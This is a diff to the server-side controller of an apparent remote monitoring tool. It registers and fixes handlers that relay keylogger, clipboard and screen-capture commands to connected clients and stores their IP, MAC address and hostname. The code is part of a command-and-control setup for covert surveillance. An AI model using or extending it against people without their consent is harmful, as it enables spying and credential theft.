@@ -25,12 +25,12 @@ public class Controller {
     public static void init() {
         put(COMMAND_LOGIN, Controller::getLogin);
         put(COMMAND_BROADCAST, Controller::getBroadcast);
-        put(COMMAND_MONITORING, Controller::getMonitoring);
-        put(COMMAND_GET_ALL_CLIENTS, Controller::getAllClients);
-        put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
         put(COMMAND_CLIPBOARD, Controller::getClipboard);
         put(COMMAND_KEYLOGGER, Controller::getKeylogger);
         put(COMMAND_CLIENT_SCREEN, Controller::getScreen);
+        put(COMMAND_MONITORING, Controller::getMonitoring);
+        put(COMMAND_GET_ALL_CLIENTS, Controller::getAllClients);
+        put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
     }
 
     private static void getScreen(JSON json, SocketModel model) {
@@ -44,26 +44,11 @@ public class Controller {
             model.onSend(new MessageModel(DEFAULT_SERVER_HOST, model.getUUID(), COMMAND_SYNC).put("clients", Server.getClientConnections().values()).json());
             return;
         }
-//        JSONArray tmp = new JSONArray(json.get("image"));
-//        int length = tmp.length();
-//        console.log(length + "");
-//
-//        byte[] arr = new byte[length];
-//        for (int i = 0; i < length; i++) {
-//            System.out.println(Byte.valueOf(tmp.get(i).toString()));
-//            arr[0] = Byte.parseByte(tmp.get(i).toString());
-//        }
-//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-//        try {
-//            byteArrayOutputStream.write(arr);
-//        } catch (IOException e) {
-//            throw new RuntimeException(e);
-//        }
         Server.getHost().onSend(json.toString());
     }
 
     private static void getKeylogger(JSON json, SocketModel model) {
-        if (json.get("uuid").equals(Server.getHost().getUUID())) {
+        if (model.getUUID().equals(Server.getHost().getUUID())) {
             Server.getClientConnections().get(json.get("to")).onSend(new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_KEYLOGGER).json());
             return;
         }
@@ -92,22 +77,18 @@ public class Controller {
             return;
         }
 
-        Server.getHost().onSend(new MessageModel(DEFAULT_SERVER_HOST, DEFAULT_SERVER_HOST, COMMAND_MONITORING)
-                .put("ram", json.get("ram"))
-                .put("cpu", json.get("cpu"))
-                .put("disk", json.get("disk"))
-                .json());
+        Server.getHost().onSend(json.toString());
     }
 
     private static void getClientSystemInfo(JSON json, SocketModel model) {
         String uuid = model.getUUID();
         ClientSocketModel client = Server.getClientConnections().get(uuid);
         JSON result = new JSON(json.get("result"));
-        client.setRam(result.get("ram"));
-        client.setCpu(result.get("ram"));
-        client.setDisk(result.get("disk"));
         client.setOs(result.get("os"));
         client.setIp(result.get("ip"));
+        client.setRam(result.get("ram"));
+        client.setCpu(result.get("cpu"));
+        client.setDisk(result.get("disk"));
         client.setMAC_address(result.get("MAC_address"));
         client.setHostName(result.get("hostName"));
         console.log("Client[" + uuid + "] updated system info!");
